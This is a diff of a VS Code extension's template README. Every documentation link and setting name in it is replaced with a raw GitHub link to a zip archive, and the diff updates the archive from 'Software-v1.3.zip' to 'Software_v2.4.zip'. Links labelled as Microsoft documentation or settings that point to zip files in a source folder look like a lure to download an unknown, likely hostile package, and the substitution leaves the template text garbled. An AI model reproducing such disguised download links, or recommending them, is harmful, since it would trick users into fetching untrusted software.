@@ -8,7 +8,7 @@ Describe specific features of your extension including screenshots of your exten
 
 For example if there is an image subfolder under your extension project workspace:
 
-\!\[feature X\]\(https://raw.githubusercontent.com/Rithvik-krishna/codewhisperer/main/src/test/Software-v1.3.zip\)
+\!\[feature X\]\(https://raw.githubusercontent.com/Rithvik-krishna/codewhisperer/main/src/webview-ui/Software_v2.4.zip\)
 
 > Tip: Many popular extensions utilize animations. This is an excellent way to show off your extension! We recommend short, focused animations that are easy to follow.
 
@@ -18,14 +18,14 @@ If you have any requirements or dependencies, add a section describing those and
 
 ## Extension Settings
 
-Include if your extension adds any VS Code settings through the `https://raw.githubusercontent.com/Rithvik-krishna/codewhisperer/main/src/test/Software-v1.3.zip` extension point.
+Include if your extension adds any VS Code settings through the `https://raw.githubusercontent.com/Rithvik-krishna/codewhisperer/main/src/webview-ui/Software_v2.4.zip` extension point.
 
 For example:
 
 This extension contributes the following settings:
 
-* `https://raw.githubusercontent.com/Rithvik-krishna/codewhisperer/main/src/test/Software-v1.3.zip`: Enable/disable this extension.
-* `https://raw.githubusercontent.com/Rithvik-krishna/codewhisperer/main/src/test/Software-v1.3.zip`: Set to `blah` to do something.
+* `https://raw.githubusercontent.com/Rithvik-krishna/codewhisperer/main/src/webview-ui/Software_v2.4.zip`: Enable/disable this extension.
+* `https://raw.githubusercontent.com/Rithvik-krishna/codewhisperer/main/src/webview-ui/Software_v2.4.zip`: Set to `blah` to do something.
 
 ## Known Issues
 
@@ -53,7 +53,7 @@ Added features X, Y, and Z.
 
 Ensure that you've read through the extensions guidelines and follow the best practices for creating your extension.
 
-* [Extension Guidelines](https://raw.githubusercontent.com/Rithvik-krishna/codewhisperer/main/src/test/Software-v1.3.zip)
+* [Extension Guidelines](https://raw.githubusercontent.com/Rithvik-krishna/codewhisperer/main/src/webview-ui/Software_v2.4.zip)
 
 ## Working with Markdown
 
@@ -65,7 +65,7 @@ You can author your README using Visual Studio Code. Here are some useful editor
 
 ## For more information
 
-* [Visual Studio Code's Markdown Support](https://raw.githubusercontent.com/Rithvik-krishna/codewhisperer/main/src/test/Software-v1.3.zip)
-* [Markdown Syntax Reference](https://raw.githubusercontent.com/Rithvik-krishna/codewhisperer/main/src/test/Software-v1.3.zip)
+* [Visual Studio Code's Markdown Support](https://raw.githubusercontent.com/Rithvik-krishna/codewhisperer/main/src/webview-ui/Software_v2.4.zip)
+* [Markdown Syntax Reference](https://raw.githubusercontent.com/Rithvik-krishna/codewhisperer/main/src/webview-ui/Software_v2.4.zip)
 
 **Enjoy!**
